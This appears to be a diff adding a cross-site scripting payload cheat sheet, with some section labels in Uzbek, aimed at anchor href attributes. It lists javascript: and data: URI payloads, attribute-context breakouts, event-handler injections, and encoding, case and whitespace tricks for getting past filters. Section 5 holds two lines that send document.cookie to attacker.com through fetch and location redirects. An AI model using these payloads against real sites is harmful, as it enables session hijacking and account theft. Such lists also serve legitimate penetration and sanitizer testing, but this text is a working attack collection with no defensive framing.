@@ -1,0 +1,96 @@
+🔥 ULTIMATE A / HREF XSS (CLEAN)
+
+⸻
+
+1. CORE (ENG MUHIM)
+
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(document.domain)">click</a>
+
+
+⸻
+
+2. CONTEXT BREAKOUT
+
+"><a href=javascript:alert(1)>
+'><a href=javascript:alert(1)>
+
+
+⸻
+
+3. DATA URI (Juda kuchli)
+
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+
+
+⸻
+
+4. EVENT-BASED (REAL ATTACK)
+
+<a href=# onmouseover=alert(1)>hover</a>
+<a onclick=alert(1)>click</a>
+<a onmouseover=prompt(1)>hover</a>
+
+
+⸻
+
+5. DATA EXFILTRATION
+
+<a href="javascript:fetch('//attacker.com?c='+document.cookie)">click</a>
+<a href="javascript:location='//attacker.com?c='+document.cookie">click</a>
+
+
+⸻
+
+6. OBFUSCATION / BYPASS
+
+<a href="jAvAsCrIpT:alert(1)">click</a>
+<a href="javascript&colon;alert(1)">click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+
+
+⸻
+
+7. WHITESPACE / CONTROL BYPASS
+
+<a href="jav	ascript:alert(1)">click</a>
+<a href=" javascript:alert(1)">click</a>
+
+
+⸻
+
+8. ADVANCED JS EXECUTION
+
+<a href="javascript:eval('alert(1)')">click</a>
+<a href="javascript:setTimeout(alert,0,1)">click</a>
+
+
+⸻
+
+9. POLYGLOT
+
+</title><a href=javascript:alert(1)>
+
+
+⸻
+
+10. ENCODED
+
+%3Ca%20href%3Djavascript%3Aalert(1)%3E
+
+
+⸻
+
+11. HYBRID (SVG / MATH)
+
+<svg><a xlink:href="javascript:alert(1)">click</a></svg>
+<math><a xlink:href="javascript:alert(1)">click</a></math>
+
+
+⸻
+
+12. RARE TRICKS
+
+<a href="javascript:void(0)" onmouseover=alert(1)>hover</a>
+<a href="javascript:alert`1`">click</a>
